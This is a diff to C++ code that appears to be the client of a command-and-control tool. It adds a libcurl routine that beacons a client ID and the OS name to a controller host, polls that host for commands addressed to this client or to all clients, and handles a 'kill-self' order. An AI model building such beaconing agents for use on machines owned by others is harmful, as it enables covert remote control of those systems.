@@ -220,6 +220,20 @@ int get_ID_num(){
     return ID;
 }
 
+//given a /url and data, this will post back data to the server
+void send_data_to_server(string url, string postMsg){
+    CURL *curl = curl_easy_init();
+    CURLcode res;
+    string serverURL = HOSTIP + url;
+
+    curl_easy_setopt(curl, CURLOPT_URL, serverURL.c_str());
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postMsg.c_str());
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, postMsg.length());
+    curl_easy_setopt(curl, CURLOPT_POST, 1);
+    res = curl_easy_perform(curl);
+    curl_easy_cleanup(curl);
+}
+
 
 int main() {
     string os_name = get_os_name();
@@ -233,6 +247,11 @@ int main() {
 
     //For testing, replace with current OS
     if (os_name == "Linux") {
+        //Check in ID with server
+        string checkinwithServer = "id=" + to_string(CLIENTNUMBER) + "&os=" + 
+        os_name;
+        send_data_to_server("checkIn", checkinwithServer);
+
         while(1)
         {
             //GET data
@@ -249,11 +268,14 @@ int main() {
             if(newCmd.ClientNumber == CLIENTNUMBER && newCmd.command == "\"kill-self\"")
             {
                 //self delete the program
+                string leaveMSG = "id=" + to_string(CLIENTNUMBER);
+                send_data_to_server("leave", leaveMSG);
                 return 0;
             }
 
             //Wait to see if the command is updated
             //The command is for the client or for all
+            //CHANGE: Check the last TIME not command. Leave for ease of testing
             if(newCmd.command == LASTCOMMAND)
             {
                 //wait 5 seconds to check for update
